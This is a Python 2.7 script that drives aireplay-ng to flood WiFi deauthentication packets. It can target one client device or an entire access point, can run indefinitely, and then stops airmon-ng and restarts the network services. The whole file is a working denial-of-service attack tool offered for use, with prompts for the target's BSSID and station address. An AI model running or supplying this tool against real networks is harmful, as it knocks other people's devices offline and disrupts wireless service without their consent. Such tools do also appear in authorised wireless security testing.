import os
import time
from NetworkCardSelection import interfaceSelectionChoiceDos
# PYTHON VERSION 2.7.13
interfaceSelection = interfaceSelectionChoiceDos()
print("Your current interface is {0}".format(interfaceSelection))
time.sleep(1)
os.system("clear")

#Make a function that uses the same network_card for this attack just as the last one (NetworkHack.py)
def dosAfterAirmon():
    print("Would you like to choose one device or the overall access point???")
    print("[1]: One Device")
    print("[2]: Access Point")
    ripNetwork = int(input("Enter Choice: "))
    if ripNetwork == 1:
        print("***You have chosen to kick off one device, please enter the following...***")
        targetBSSID = raw_input("What is the target's BSSID: ")
        targetClient = raw_input("What is the target's Station: ")
        packetNumber = int(raw_input("How many packets to flood device?? (0 for non-stop): "))
        print("Press Ctrl+c to stop the attack")
        time.sleep(2)
        print("[+] Starting Attack...")
        os.system("aireplay-ng --deauth {0} -a {1} -c {2} {3}".format(packetNumber, targetBSSID, targetClient, interfaceSelection))
    elif ripNetwork == 2:
        print("***You have chosen to m3rk the access point.... Please enter the following...***")
        targetBSSID = raw_input("What is the target's BSSID: ")
        packetNumber = int(raw_input("How many packets to flood device?? (0 for non-stop): "))
        print("Press Ctrl+c to stop the attack, or this program will stop once it is done...")
        time.sleep(2)
        print("[+] Starting attack...")
        os.system('aireplay-ng --deauth {0} -a {1} {2}'.format(packetNumber, targetBSSID, interfaceSelection))
    else:
        afterAttack()
        fixNetworkMangers()
        exit()


def fixNetworkMangers():
    #Runs script I created to fix the network-manager once an attack is finished
    networkFix = raw_input("Would you like to fix the network-manager? Y/n: ")
    if networkFix == "Y":
        print("***Starting to reset network managers***")
        os.system("service networking start")
        os.system("service network-manager start")
        os.system("/etc/init.d/networking start")
        os.system("/etc/init.d/networking-manager start")
        print("***If stuff isn't popping up below/above... God help you.***")
        exit()
    else:
        exit()

def afterAttack():
    #This is stopping airmon-ng and beginning networkFix
    print("***Stopping airmon-ng on {0}...***".format(interfaceSelection))
    os.system("airmon-ng stop {0}".format(interfaceSelection))
    print("***Starting network fix***")
    fixNetworkMangers()


dosAfterAirmon()
